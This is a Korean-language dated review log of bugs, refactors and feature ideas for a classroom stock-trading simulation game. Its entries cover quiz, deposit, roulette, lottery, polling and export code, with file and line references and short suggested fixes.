- **`submitQuiz()` 타임아웃 분기에서 서버 응답의 `explanation`이 학생에게 미표시** (`app.js:875-879`): 정답·오답 분기에서는 `data.explanation`이 결과 HTML에 포함(app.js:883, 887)되는 반면, 타임아웃(`answer === null`) 분기는 `td = await api.post('/quiz', {answer: false})` 를 호출한 뒤 `td.explanation`을 무시함. 학생이 "왜 틀렸는지" 설명을 보지 못해 학습 기회를 놓침. `if (td?.explanation) result.innerHTML += \`<div style="color:var(--muted);font-size:13px;margin-top:8px">\${td.explanation}</div>\`` 3줄 추가로 타임아웃에도 해설 표시. 서버 변경 불필요.

- **`_end_room()` 예금 이자 계산이 게임 일시정지 시간을 held_seconds에 포함해 이자 과대 지급 가능** (`app.py:133-143`): `held_seconds = (game_end - d.created_at).total_seconds()` — `game_end`는 `room.paused_at`(일시정지 시)이지만 `d.created_at`은 예금 가입 시점의 wall-clock 시간. 예금 가입 후 진행자가 일시정지하면 정지 중에도 held_seconds가 증가. 예금 가입 시 `room.end_time - datetime.utcnow()` (즉, 잔여 게임 시간)를 `d.remaining_game_seconds`로 저장하고, 종료 시 `(d.remaining_game_seconds / total_seconds)` 를 ratio로 사용하면 일시정지 영향 없이 정확한 이자 계산 가능. 현재 `Deposit` 모델에 `remaining_game_seconds FLOAT` 컬럼 추가 필요(ALTER TABLE 패턴 이미 app.py:31-40에 존재).

- **`api.get()`·`api.post()`에 fetch 타임아웃 없어 서버 무응답 시 폴링 콜백이 무한 병렬 누적** (`app.js:30-44`): `fetch()` 기본 동작에 타임아웃이 없어 서버가 응답을 지연하면 이전 폴링 요청이 완료되지 않은 채 다음 10초 폴링 콜백이 시작됨. 결국 pending 요청이 쌓여 서버 복구 시 폭발적 재요청 발생. `api` 객체 메서드에 `AbortController` 패턴: `const ctrl = new AbortController(); setTimeout(() => ctrl.abort(), 8000); const r = await fetch(url, {signal: ctrl.signal}).catch(() => ({ok:false,status:0}))` 로 교체하면 8초 초과 요청을 자동 취소. 3개 메서드에 각 3줄 추가.

- **Chart.js `destroy()` 후 변수를 `null`로 초기화하지 않아 예외 발생 시 stale 참조 잔류** (`app.js:1375, 1486, 1509, 1854`): `if (S.stockChart) S.stockChart.destroy(); S.stockChart = new Chart(...)` 패턴에서 `destroy()` 직후 `S.stockChart = null` 없음. `destroy()` 중 예외가 발생하면 `S.stockChart`이 파괴된 인스턴스를 가리킨 채로 남아 다음 `if (S.stockChart) S.stockChart.destroy()` 호출 시 이미 파괴된 인스턴스를 재파괴 시도해 런타임 에러 가능. `S.stockChart`, `S.portChart`, `S.assetLineChart`, `S.resultsBarChart` 각 `destroy()` 직후 `S.XXXChart = null` 한 줄씩 추가(총 4줄). `S.hostBarChart`는 update() 패턴이라 해당 없음.

- **`loadDepositsPage()` 에서 `/portfolio` → `/deposits` 를 순차 await로 직렬 요청** (`app.js:1621-1629`): `await api.get('/portfolio')` 완료 후에야 `await api.get('/deposits')` 가 시작됨. 두 요청이 서로 독립적이라 `Promise.all()` 로 병렬화하면 레이턴시가 두 요청 중 느린 쪽으로 수렴(직렬 대비 약 40-50% 단축). `const [port, data] = await Promise.all([api.get(\`/api/rooms/${S.room.id}/portfolio\`), api.get(\`/api/rooms/${S.room.id}/deposits\`)])` 1줄 교체. 동일 순차 패턴이 `loadResults()`(`app.js:1702-1704`), `openStockModal()`(`app.js:1344`)에도 적용 가능.

- **`export_rankings()` 내부 `import openpyxl` 이 파일 상단 임포트 스타일과 불일치** (`app.py:1422-1424`): `openpyxl`, `BytesIO`, `Font`, `PatternFill` 등 4줄의 임포트가 API 핸들러 함수 내부에 위치해 있어 파일 전체 코드 스타일(상단 일괄 임포트)과 충돌. Python `sys.modules` 캐시로 두 번째 이후 임포트는 즉시 반환되므로 지연 임포트의 성능 이점이 없음. `openpyxl`이 미설치된 환경을 방어하려면 `try: import openpyxl; from openpyxl.styles import ... except ImportError: openpyxl = None` 을 파일 최상단에 두고 핸들러에서 `if openpyxl is None: return jsonify({'error': 'openpyxl 미설치'}), 501` 처리가 더 명확. 현행 4줄 내부 임포트를 상단으로 이동.

---

## 2026-07-03

### 추가하면 좋을 기능

- **학생 실수 퇴장 시 자동 복귀 제안 없음** (`app.js:114-118 confirmLeaveGame()`, `app.js:73-80 doAuth()`): 학생이 실수로 "← 나가기"를 누르면 세션이 끊기고 재입장 시 학번·이름을 다시 입력해야 함. `goHome()` 호출 시 `localStorage.setItem('last_game', JSON.stringify({sid, name, code: S.room?.code}))` 로 마지막 게임 정보를 저장하고, 참가 화면 진입 시 저장된 값이 있으면 입력 필드를 자동완성 + "이전 게임(코드: XXXX)에 빠르게 재입장" 버튼을 표시하면 30초 내 복귀 가능. 서버 변경 불필요, 클라이언트 약 15줄 추가.

- **대기 화면(waiting)에서 방 설정 수정 불가** (`app.py:363-390 create_room()`): 학생들이 입장한 후 뒤늦게 "30분이 아닌 20분으로 하자"는 등 설정을 바꾸려면 방을 삭제하고 다시 만들어야 함. `PUT /api/rooms/<rid>` 엔드포인트를 추가하고 `room.status == 'waiting'` 조건에서만 `duration_minutes`, `starting_cash`, `deposit_rate` 수정을 허용하면 됨(~15줄). 호스트 로비 화면에 "⚙️ 설정 수정" 버튼 하나 추가. 이미 입장한 학생의 `RoomMember.cash`는 게임 시작 시 `starting_cash`로 재설정하면 일관성 유지 가능.

- **진행자가 지금까지 발생한 뉴스 이력을 확인할 수 없음** (`stock_service.py:141-158 _generate_news()`, `app.py:690-701 host_send_news()`): 자동 뉴스가 발생해도 진행자는 학생들이 보는 내용을 알기 어려움. `StockService.__init__()`에 `self._news_history: list = []` deque(maxlen=5)를 추가하고, `_generate_news()` 완료 시 `self._news_history.append(self._news)` 로 최근 5건 보관. `GET /api/rooms/<rid>/news` 응답에 `'history': self._news_history` 를 포함해 진행자 화면 설정 탭에 "최근 뉴스 이력" 아코디언을 표시하면 수업 진행 맥락 파악 용이.

- **`member_total_value()` 가 rankings·host_members에서 멤버마다 N번 DB 쿼리 발생** (`app.py:107-118`, `app.py:542-562 host_members()`, `app.py:808-824 get_rankings()`): 30명 방 기준 `get_rankings()` 1회 호출 시 `RoomHolding` 30회 + `Deposit` 30회 = 60회 쿼리. 두 API 모두 `RoomHolding.query.filter_by(room_id=rid).all()` 과 `Deposit.query.filter_by(room_id=rid, status='active').all()` 을 각 1회 일괄 조회한 뒤 Python dict로 `user_id → holdings/deposits` 를 매핑하면 O(N) → O(1) 쿼리로 감소. `host_members()`에 이미 `user_map` 패턴이 적용되어 있으므로(`app.py:550`) 동일 방식 확장이 자연스러움.

- **퀴즈 결과 해설이 타임아웃 시에는 미표시** (`app.js:875-890 submitQuiz()`): 정답/오답 분기에서는 `data.explanation` 이 화면에 표시되지만, 30초 타임아웃 발생 시(`answer === null` 분기, `app.js:875`)에는 `POST /quiz {answer: false}` 를 호출해 패널티만 적용하고 `td.explanation` 을 무시함. 학생이 "왜 틀렸는지" 확인할 기회가 없어 교육 효과가 반감됨. `app.js:878` 의 타임아웃 결과 렌더링에 `if (td?.explanation) result.innerHTML += \`<div style="font-size:13px;color:var(--muted);margin-top:8px">\${td.explanation}</div>\`` 3줄 추가로 해결. 서버 변경 불필요.

---

### 제거/단순화할 것들

- **`startTimer()` 에 기존 인터벌 정리 코드 없어 이중 실행 가능** (`app.js:1155-1165 startTimer()`): `enterHostGame()`, `enterParticipantGame()`, `resumeRoom()` 경로에서 `startTimer()`가 호출될 수 있고, `stopTimer()`가 중간에 호출되지 않으면 `S.timerInterval` 이 두 개 동시 실행되어 타이머가 2배 속도로 깜빡임. `startTimer()` 함수 첫 줄에 `clearInterval(S.timerInterval);` 한 줄을 추가하면 방어 가능. 현재 `stopTimer()` 를 `showLanding()`에서만 호출하는 설계상 재진입 위험이 상존.

- **뉴스 폴링과 룸 상태 폴링이 별도 인터벌로 이중 실행** (`app.js:8 S.newsInterval`, `app.js:267-271 enterHostGame()`, `app.js:613-614 enterParticipantGame()`): `S.pollInterval`(10초 룸 상태)과 `S.newsInterval`(별도 주기 뉴스)이 동시에 설정됨. 두 인터벌을 합쳐 룸 상태 폴링 응답(`GET /api/rooms/<rid>`)에 `current_news` 필드를 포함하거나, 뉴스를 룸 상태 폴링 콜백 내 조건부 호출로 통합하면 서버 요청 횟수를 20~30% 절감 가능. Render 무료 티어에서 가용 대역폭 절감 효과 직접적.

- **`S.assetHistory` 배열이 게임 내내 무제한 증가** (`app.js:19`, `app.js:696-710`): 포트폴리오 탭 "자산 변화" 선 그래프를 위해 `S.assetHistory.push({t, v})` 가 10초마다 누적됨. 60분 게임에서 약 360개 포인트로 큰 문제는 없지만 360분 게임에서 2,160개가 될 수 있음. `S.assetHistory.push(...)` 직후 `if (S.assetHistory.length > 120) S.assetHistory.shift()` 한 줄로 슬라이딩 윈도우 적용. Chart.js 렌더도 최근 120포인트(20분 분량)만 표시하면 선 그래프 가독성도 향상.

- **`get_room()` 에 부작용(상태 변경) 로직이 인라인으로 존재** (`app.py:432-473`): GET 핸들러임에도 불구하고 룸 종료 체크(`_end_room()`), 룰렛 자동 트리거, `_auto_start_lottery_if_due()` 등 상태를 변경하는 로직이 함수 본문에 직접 존재. 매 10초 폴링마다 이 분기들이 실행되며 가독성을 저해하고 테스트를 어렵게 만듦. `_maybe_end_room(room, now)`, `_maybe_trigger_roulette(room, now)` 등의 헬퍼 함수로 추출하면 각 책임이 명확해지고 `get_room()`은 조회 + 헬퍼 호출만 담당하게 됨. 로직 변경 없는 순수 리팩터링으로 2~3시간 작업 분량.

- **`history` 차트의 X축 레이블이 실제 날짜(`2026-06-01`)여서 "이게 실제 주가인가요?" 혼란 유발** (`stock_service.py:297`): `date_str = datetime.utcfromtimestamp(now - i * 86400).strftime('%Y-%m-%d')` 로 실제 캘린더 날짜가 X축에 표시됨. 30분짜리 가상 게임에서 "지난 1달" 차트를 보면 학생들이 "삼성전자 실제 차트인가요?" 라고 묻는 상황 발생. `f"D-{i}"` 또는 `f"라운드 {n_bars - i}"` 같은 상대 레이블로 바꾸면 1줄 수정으로 교육용 시뮬레이션임을 명확히 전달 가능.

---

## 2026-07-03 (2차)

### 추가하면 좋을 기능

- **퀴즈 보상/패널티 실제 금액 실시간 프리뷰** (`app.js:1130-1141`): `quiz-reward-input`, `quiz-penalty-input` 의 `%` 값이 바뀔 때 `S.room.starting_cash * value / 100` 계산 결과를 입력 필드 바로 아래에 실시간 표시(`예: 100% → ₩10,000,000`). 현재는 비율만 입력하면 학생당 실제 영향 금액을 가늠하기 어렵고 퍼센트 스케일을 잘못 설정하는 오류가 빈번. `input` 이벤트 리스너 + DOM 텍스트 노드 업데이트 약 5줄, 서버 변경 없음.

- **엑셀 내보내기 방 메타데이터 헤더 행 추가** (`app.py:1442-1488`): 현재 `export_rankings()`가 출력하는 엑셀 파일은 이름·순위·자산 컬럼만 있고 "어느 방, 언제 진행한 게임"인지 정보가 없음. 첫 1~3행에 `방 이름`, `게임 날짜`, `시작 자금`, `게임 시간(분)` 을 메타 행으로 삽입하고 파일명도 `rankings.xlsx` → `rankings_<방이름>_<날짜>.xlsx` 로 변경하면 보관·비교 편의성이 크게 향상됨. `openpyxl ws.insert_rows(1, 3)` 3줄과 `filename = f"rankings_{room.name}_{datetime.utcnow().strftime('%Y%m%d')}.xlsx"` 1줄 수정.

- **시장 탭 섹터별 수익률 요약 칩 표시** (`app.js:1229-1244`): `loadMarket()` 에서 `S.stocks` 배열을 가져올 때 섹터별 평균 `change_pct` 를 계산하고, 종목 테이블 상단에 `[반도체 ▲+2.3%]`, `[바이오 ▼-1.1%]` 형태 칩을 렌더링. 학생이 어느 섹터가 흐름을 주도하는지 한눈에 파악 가능. `S.stocks`는 이미 클라이언트에 있으므로 서버 요청 없이 reduce 연산으로 약 10줄 추가.

- **모바일 입력 필드 autocomplete/autocorrect 방지 속성 누락** (`index.html` 학번·이름 입력 필드): 학번·이름 입력 필드에 `autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false"` 가 없어서 모바일에서 자동완성이 엉뚱한 값(전화번호, 이전 입력값)을 채우거나 이름 첫 글자가 대문자로 자동 변환됨. `index.html` 의 해당 `<input>` 태그에 속성 4개 추가, HTML 수정만으로 해결.

- **포트폴리오 분산도 지표 배지 표시** (`app.js:1457-1566`): `loadPortfolio()` 에서 `holdings` 배열을 렌더링할 때 보유 섹터 종류를 중복 제거해 `[보유 섹터: 반도체·IT·바이오 3개]` 배지를 포트폴리오 상단에 표시. 섹터 1개 집중 보유 시 `⚠️ 섹터 집중도 높음` 경고 추가 가능. 기존 `S.stocks` 에 섹터 정보가 있으므로 클라이언트 로직 약 8줄 추가, 서버 변경 없음.

- **진행자 전체 퀴즈 상태 초기화 버튼** (`app.py:1245-1247`): `_quiz_state = {}` 는 앱 재시작 없이는 초기화 방법이 없어, 이전 퀴즈 응답 이력이 남아있으면 "이미 응답" 상태가 사라지지 않음. `DELETE /api/rooms/<rid>/host/quiz-state` 엔드포인트를 추가해 `_quiz_state[rid] = {}` 를 실행하도록 약 8줄, 진행자 퀴즈 패널에 "퀴즈 초기화" 버튼 1개 추가로 운영 유연성 확보.

### 제거/단순화할 것들

- **`minigame_spin()` 예금 부분 인출 미지원으로 초과 차감** (`app.py:1049-1058`): 룰렛 당첨금 지급 시 shortfall(부족분) 보전을 위해 활성 예금을 순서대로 해지하는데 `m.cash += d.amount; shortfall -= d.amount` 가 전액을 빼가므로, shortfall 20만·예금 100만인 경우 80만이 초과 차감됨. `take = min(d.amount, shortfall); m.cash += take; d.amount -= take; shortfall -= take; if d.amount == 0: d.status = 'withdrawn'` 패턴으로 수정하면 최소 필요 금액만 해지. 동일 로직이 `_end_room()`에도 있는지 교차 확인 필요.

- **`_roulette_config`·`_quiz_settings` 재시작 시 소실** (`app.py:250`, `app.py:1246`): 두 딕셔너리가 순수 인메모리라 Render 서버 재시작(무료 티어 15분 슬립)마다 설정 초기화. `Room` 모델에 `roulette_config = db.Column(db.Text)` (JSON 직렬화), `quiz_reward_pct = db.Column(db.Float, default=10.0)`, `quiz_penalty_pct = db.Column(db.Float, default=5.0)` 컬럼을 추가하고 읽기/쓰기를 DB로 이전하면 Render 재배포 후에도 설정 유지. ALTER TABLE 3줄 마이그레이션으로 무중단 적용 가능.

- **`host_force_price()` pct=0 통과 시 방향 오류 뉴스 생성** (`app.py:682-683`): 유효성 검사 조건이 `if not symbol or abs(pct) > 50:` 이라 `pct=0` 요청이 통과됨. `stock_service.force_price()` 내부에서 `direction = 'up' if pct > 0 else 'down'` 분기 시 pct=0이면 'down'으로 판정돼 `"[이름] 하락"` 뉴스가 생성되는 오작동 발생. `host_market_event()`(`app.py:1355`)가 이미 `if pct == 0 or abs(pct) > 50:` 로 처리하듯 동일 조건 추가, 1줄 수정.

- **`host_adjust()` note 필드 길이 미검증으로 DB 오류 위험** (`app.py:596`): `db.Column(db.String(200))` 상한이 설정돼 있지만 요청 데이터의 note 값을 그대로 저장하므로, 200자 초과 입력 시 PostgreSQL에서 `DataError: value too long` 예외 발생(SQLite는 무시). `note = (d.get('note', '') or '')[:200]` 한 줄로 서버 사이드 방어. 클라이언트 `index.html` 의 해당 textarea에 `maxlength="200"` 추가도 병행 권장.

- **`doAdjust()` delta=0 미방지로 불필요한 트랜잭션 기록** (`app.js:491-495`): `if (isNaN(delta))` 체크만 있어 0원 조정 요청이 서버로 전송되고 `RoomTransaction` 레코드가 생성됨. 학생 거래 내역에 "0원 조정" 항목이 표시되어 혼란 야기. `if (isNaN(delta) || delta === 0) { err.textContent = '0이 아닌 금액을 입력하세요.'; return; }` 로 1줄 수정. 서버 `host_adjust()` 에도 `if amount == 0: return jsonify({'error': '0원 조정 불가'}), 400` 방어를 추가하면 이중 방어 완성.

- **`loadParticipantRankings()` 비배열 응답 시 "참여자 없음" 오작동** (`app.js:1679`): `if (!data.length)` 조건에서 `data = {error: 'HTTP 500'}` 처럼 오류 객체가 반환될 경우 `data.length === undefined` → `!undefined === true` 로 평가돼 "참여자 없음" 빈 화면을 표시. 실제 오류를 학생이 알 수 없어 디버깅이 어려움. `if (!Array.isArray(data)) { list.innerHTML = '<div class="empty-state">랭킹을 불러올 수 없습니다.</div>'; return; }` 가드를 `!data.length` 체크 앞에 추가, 2줄 수정.

---

## 2026-07-04

### 추가하면 좋을 기능

- **퀴즈 타임아웃 시 해설 미표시** (`app.js:875-880 submitQuiz()`): `answer === null` 분기(30초 타임아웃)에서 `POST /quiz {answer: false}` 를 보내고 패널티만 보여주되 `td.explanation` 을 렌더링하지 않음. 학생이 "왜 틀렸는지" 확인 불가로 교육 효과 반감. `app.js:878` 다음에 `if (td?.explanation) result.innerHTML += \`<div style="color:var(--muted);font-size:13px;margin-top:8px">\${td.explanation}</div>\`` 3줄 추가, 서버 변경 없음.

- **결과 화면에서 개인 자산 변화 선 그래프 재활용** (`app.js:1702-1795 loadResults()`): 게임 중 `S.assetHistory` 배열(`app.js:19`)에 10초마다 자산이 누적되지만, 결과 화면(`screen-results`)으로 전환 시 이 데이터가 재활용되지 않음. `loadResults()` 내부에 `S.assetHistory.length >= 2`를 조건으로 "내 자산 변화" 선 그래프(`canvas` + Chart.js)를 "내 결과" 카드(`results-my-stats`) 아래에 삽입하면 학생이 자신의 투자 여정을 복기 가능. 클라이언트 약 20줄 추가, 서버 변경 없음.

- **복권 picking 단계에서 진행자에게 제출 인원 실시간 표시** (`app.py:1114-1147 get_lottery()`, `app.js:2079-2087 _showLotHostPickingUI()`): `_lots[rid]['current']['picks']` 딕셔너리에 이미 제출자 수가 있지만 `/api/rooms/<rid>/lottery` 응답에 `submitted_count` 필드가 없음. 응답에 `'submitted_count': len(cur.get('picks', {}))` 1줄 추가, 진행자 picking UI(`lhost-pick-countdown` 영역)에 "N명 제출 완료" 텍스트 표시하면 진행자가 강제 drawing 전환 타이밍을 판단하는 데 도움.

- **세션 만료 시 자동 랜딩 화면 전환 없음** (`app.js:29-44 api.get/post`): 401 Unauthorized 응답이 `{error: 'HTTP 401'}` 로만 처리돼 polling 도중 쿠키 만료 시 오류 토스트만 반복 표시. `api.get/post` 래퍼에 `if (r.status === 401) { S.user = null; S.room = null; showLanding(); return {error: '세션 만료'}; }` 블록을 추가하면 세션 만료를 자동 감지해 홈으로 이동. Render 무료 티어 슬립 복귀 후 세션 유실 상황에서 특히 유용.

- **차트 모달 내 주가가 개장 후 갱신되지 않음** (`app.js:1327-1357 openStockModal()`): 모달 열릴 때 `st.price` 를 한 번 세팅하고 이후 갱신이 없어 장시간 모달을 열어두면 표시 가격이 stale. 모달이 열려있는 동안 5~10초 인터벌로 `GET /api/rooms/<rid>/stocks` 에서 해당 종목 가격만 찾아 `ms-price` 엘리먼트를 업데이트하는 폴러를 추가하면 실시간감 향상. `closeModal()` 시 인터벌 정리 필요.

- **진행자 게임 중 문제 참가자 처리 수단 부재** (`app.py:564-575 kick_member()`): `if room.status != 'waiting': return ... 400` 로 게임 중 강퇴가 막혀 있음. 게임 중 전액 환불 후 제거는 복잡하지만, `host_adjust()` 를 이용해 해당 참가자의 자산을 0으로 설정하거나 별도 `freeze_member()` 엔드포인트로 해당 참가자의 거래만 막는 방식이 현실적. 교실 환경에서 부정행위 대응 수단이 없으면 운영 곤란.

### 제거/단순화할 것들

- **`goHome()` 이 불필요하게 로그아웃 API 호출** (`app.js:108-112`): `goHome()`이 `POST /api/auth/logout` 을 호출하고 `S.user = null` 을 세팅함. 이 때문에 "게임 나가기" 후 새로고침 시 자동 재입장(`/api/auth/me` 세션 복구)이 불가. "게임 나가기"와 "로그아웃"의 의미가 달라야 하는 교실 맥락에서 `goHome()`은 클라이언트 상태 초기화만 해야 함(서버 세션 유지). `doLogout()`(명시적 로그아웃)과 역할 분리 필요. 1줄 `await api.post('/api/auth/logout', {})` 제거.

- **가격 상·하한이 `_next_price()`와 `force_price()`·`force_sector_event()` 간 불일치** (`stock_service.py:139`, `stock_service.py:225`, `stock_service.py:253`): 자동 가격 변동은 `base * 0.6 ~ base * 1.4` 범위, 수동 강제 변동은 `base * 0.3 ~ base * 3.0` 범위. 동일 종목에 대해 정책이 달라 일관성 없음. 모듈 상단에 `PRICE_FLOOR = 0.5; PRICE_CEIL = 2.0` 상수를 정의하고 세 곳을 동일 값으로 교체하면 정책 통일 + 유지보수 용이. 현재 `force_price` 한도를 300%까지 허용하면 학생들이 게임을 망가뜨릴 수 있음.

- **`host_force_price()` 에서 `pct=0` 요청이 통과돼 하락 뉴스 오생성** (`app.py:682-683`): 유효성 검사가 `if not symbol or abs(pct) > 50:` 이라 `pct=0` 통과. `stock_service.force_price()` 내부 `direction = 'up' if pct > 0 else 'down'` 에서 pct=0이 'down'으로 판정돼 거짓 하락 뉴스 생성. `host_market_event()`(`app.py:1355`)의 `if pct == 0 or abs(pct) > 50:` 와 동일 패턴으로 수정, 1줄.

- **`host_adjust()` note 필드 길이 미검증으로 PostgreSQL DataError 위험** (`app.py:596-603`): `db.Column(db.String(200))` 로 모델에 200자 제한이 있지만 입력값을 그대로 저장해 200자 초과 시 PostgreSQL에서 `DataError` 발생(SQLite는 무시). `note = (d.get('note', '') or '')[:200]` 1줄 추가. `index.html:790` `adj-note` 입력 필드에 `maxlength="200"` 병행 추가.

- **`doAdjust()` 에서 delta=0 미방지로 0원 트랜잭션 생성** (`app.js:491-495`): `isNaN(delta)` 체크만 있어 0원 조정이 서버로 전송되고 `RoomTransaction` 레코드가 생성됨. 거래 내역에 "0원 조정" 항목이 표시돼 혼란. `if (isNaN(delta) || delta === 0) { err.textContent = '0이 아닌 금액을 입력하세요.'; return; }` 1줄 수정. 서버 `host_adjust()`에도 `if not delta: return jsonify({'error': '0원 조정 불가'}), 400` 추가 권장.

- **`_rlt_active`·`_quiz_settings`·`_roulette_config` 재시작 시 소실** (`app.py:250-252`, `app.py:1246`): 인메모리 딕셔너리라 Render 무료 티어 15분 슬립·재배포마다 초기화됨. 룰렛 확률 설정이 사라지면 기본값(꽝 70%)으로 돌아가 진행자가 수업 전 설정한 값이 증발. `Room` 모델에 `roulette_config JSON 컬럼`, `quiz_reward_pct FLOAT`, `quiz_penalty_pct FLOAT` 추가 후 DB 지속화 권장. `ALTER TABLE` 마이그레이션 3줄, 읽기/쓰기 핸들러 수정.


## 2026-07-04

### 추가하면 좋을 기능

- **호스트 "거래 잠금" 토글** (`app.py:724-767`, `app.js:1437-1470`): 타이머를 멈추지 않고 전체 학생의 매수/매도만 일시 차단하는 기능. 현재는 `pause_room()`으로만 거래를 막을 수 있어 시간이 함께 정지됨. `Room` 모델에 `trading_locked = db.Column(db.Boolean, default=False)` 컬럼 추가 + `trade()` 진입부에 `if room.trading_locked: return jsonify({'error': '거래가 잠겨 있습니다.'}), 403` 1줄 삽입. 교사가 해설·강의 중 학생 거래를 멈추고 싶을 때 타이머 차감 없이 사용 가능.

- **호스트 대시보드에서 학생별 보유 종목 드릴다운** (`app.py:432-473`, `app.js:408-431`): 현재 `loadHostMembers()`는 순위·현금·총평가액만 표시하고 어떤 종목을 얼마나 보유하는지 볼 수 없음. `/api/room/<id>/host/member/<uid>/holdings` GET 엔드포인트를 추가해 `RoomHolding` 쿼리 결과(종목·수량·평균단가·현재평가액)를 반환하면, 호스트가 이름 클릭 시 모달로 학생 포트폴리오 확인 가능. 기존 `member_total_value()` (`app.py:107-118`)의 쿼리를 재활용.

- **게임 종료 후 학생 개인 성과 요약** (`app.py:1419-1488`, `models.py:68-79`): 결과 화면에 개인 최고 수익 단일 거래·최대 손실 거래·가장 많이 거래한 종목을 표시하면 교육 효과 상승. `RoomTransaction` 테이블에 `room_id + user_id` 조건으로 BUY/SELL 쌍을 매칭해 실현 손익 계산 가능. `/api/room/<id>/results/personal` 엔드포인트를 추가하고 결과 뷰(`showResults()`) 하단 섹션에 렌더링. 기존 데이터만 사용하므로 모델 변경 불필요.

- **섹터별 뉴스 영향 시각화** (`stock_service.py:155-172`, `app.js:1208-1244`): `_current_biases` 딕셔너리(`stock_service.py:155`)에 종목별 현재 업/다운 바이어스가 존재하나 클라이언트에 전달되지 않음. `/api/room/<id>/market` 응답에 `bias` 필드(값: `"up"`, `"down"`, `null`)를 포함시키고, `renderMarket()`에서 카드 배경에 연한 녹색/적색 틴트를 적용하면 학생이 뉴스 영향을 직관적으로 파악 가능. 1줄 응답 추가 + CSS 2줄.

- **게임 속도 조절 UI를 호스트 게임 화면 메인에 노출** (`app.py:1139-1158`, `app.js:856-900`): `/api/room/<id>/host/news-interval` POST로 `price_seconds`·`news_seconds`를 변경하는 엔드포인트가 이미 존재하나, 설정 탭에만 있어 게임 진행 중 접근이 불편함. 호스트 게임 뷰 상단 툴바에 "속도: 🐢 / 🚀" 토글 버튼을 추가해 빠른 속도(price 5s/news 15s)·기본(10s/30s)·느린 속도(20s/60s) 3단계로 전환하면 수업 흐름에 맞게 실시간 조정 가능. 기존 엔드포인트 재사용, JS 토글 로직 ~20줄 추가.

### 제거/단순화할 것들

- **`resume_room()`이 룰렛·복권 진행 중 재개 가능** (`app.py:503-517`): `pause_room()`은 `status='paused'`만 세팅하고 `resume_room()`도 상태만 `active`로 바꿔 `_rlt_active[room_id]` 또는 `_lots` 복권 상태를 확인하지 않음. 교사가 룰렛 회전 도중 수동으로 재개하면 룰렛 결과 배분 직전에 학생 거래가 열려 결과를 예측한 거래가 가능해짐. `resume_room()` 진입부에 `if _rlt_active.get(room_id): return jsonify({'error': '룰렛 진행 중 재개 불가'}), 400` 1줄 추가.

- **`host_roulette_config()` POST가 첫 슬롯을 무음으로 0으로 강제** (`app.py:1378`): `mults = [0] + [max(0, float(x)) for x in raw_m[1:]]` 코드가 교사 입력값 `multipliers[0]`을 무조건 버림. 교사가 첫 칸에 0.5를 넣어도 0으로 교체되며 피드백이 없음. 의도적 강제라면 주석 추가 또는 검증 메시지(`"첫 슬롯은 항상 꽝(0)입니다."`) 응답에 포함. 의도가 아니라면 `mults = [max(0, float(x)) for x in raw_m]`으로 수정.

- **`_lot_round_due()` 경계값 포함 여부 불일치** (`app.py:185-198`): `pct >= 1/3`과 `pct >= 2/3` 비교에서 부동소수점 오차로 정확히 1/3·2/3에 도달한 순간 예상과 다른 라운드가 반환될 수 있음. 실제로는 10초 폴링 주기 때문에 정확한 경계 도달이 드물지만, `round(pct, 6) >= round(1/3, 6)` 또는 명시적 `ROUND_THRESHOLDS = [1/3, 2/3]` 상수로 교체해 의도를 명확히 하면 향후 폴링 주기 변경 시 혼란 방지.

- **`trade()` 와 `create_deposit()`에 최소 금액 검증 없음** (`app.py:738`, `app.py:887`): 학생이 1주짜리 매수(수천 원)나 1원 예금을 생성 가능. 거래 내역·예금 목록이 의미 없는 소액으로 오염되고 순위 계산 쿼리(`member_total_value()`, `app.py:107-118`) 부하 증가. `trade()` 에 `if qty < 1: return error`, `create_deposit()`에 `if amount < 10000: return jsonify({'error': '최소 예치 금액은 10,000원입니다.'}), 400` 추가.

- **`stopPolling()`이 `_lotPollInterval` 을 클리어하지 않음** (`app.js:779-782`): `stopPolling()`은 `clearInterval(S.pollInterval)`, `clearInterval(S._waitingPoll)`, `stopNewsPolling()`을 호출하지만 `_lotPollInterval` 은 건드리지 않음. 게임 종료·방 나가기 시 복권 3초 폴이 계속 작동해 불필요한 네트워크 요청 발생. `stopPolling()` 내부에 `_stopLotPolling()` 호출 1줄 추가.

## 2026-07-05

### 추가하면 좋을 기능

- **`searchGlossary()`가 매 키입력마다 서버 API 호출** (`app.js:1927-1931`): `S.glossaryData` 배열에 전체 용어 데이터가 이미 캐시되어 있는데도 키입력마다 `GET /api/education/glossary?q=...` 를 호출. 네트워크 지연으로 검색 반응이 느리고 서버 부하 불필요. `await api.get(...)` 1회 호출을 제거하고 `S.glossaryData.filter(g => !q || g.term.includes(q) || g.definition.includes(q))` 클라이언트 필터로 교체하면 서버 요청 없이 즉각 반응. 3줄 수정, 서버 변경 없음.

- **타이머가 클라이언트 시계 기반이라 기기 시계 오차 누적** (`app.js:769`): `Math.floor((new Date(S.room.end_time) - new Date()) / 1000)` 으로 잔여 시간을 계산해 학생 기기 시계가 서버와 다를 경우 타이머가 실제보다 빠르거나 느리게 표시됨. 서버 폴 응답의 `remaining_seconds`(`app.py:285-286`)를 기준으로 클라이언트 `performance.now()` 앵커를 세팅하고 이후 보간하는 방식(`serverRemaining - (performance.now() - anchorMs) / 1000`)으로 교체하면 기기 시계와 무관하게 정확한 타이머 보장. `startTimer()` 내 약 5줄 수정.

- **`get_history()`가 실제 게임 가격 이력 대신 매번 랜덤 OHLC 생성** (`stock_service.py:281-310`): 차트를 열 때마다 현재가에서 역방향으로 완전 랜덤 데이터를 생성하므로 같은 종목 차트를 두 번 열면 다른 모양이 나옴. 학생이 "이 종목은 꾸준히 상승했었다"는 식의 추세 분석이 불가능해 교육 효과 반감. `StockService.__init__`에 `self._price_log: dict = {sym: [] for sym in STOCKS}` 추가, `get_price()` 에서 새 가격 산출 시 `(now, new_price)` append(최대 200개), `get_history()`에서 로그를 캔들 바로 변환하면 실제 게임 내 가격 추이를 반영한 차트 제공. 서버 약 15줄 추가, 클라이언트 변경 없음.

- **`startWaitingPoll()`이 결과 발표 전까지 무한 반복** (`app.js:785-796`): 3초마다 `GET /api/rooms/<rid>` 를 호출하며 진행자가 결과 발표를 잊거나 세션을 닫으면 학생 기기가 수십 분간 요청을 반복. 카운터를 추가해 약 10분(200 × 3초) 후 폴링을 자동 중단하고 "새로고침 해주세요" 안내를 표시하는 안전장치 필요. `let _waitPoll_attempts = 0;` + `if (++_waitPoll_attempts > 200) { clearInterval(S._waitingPoll); toast('결과 대기 시간 초과. 새로고침하세요.', 'warn'); }` 약 5줄 추가.

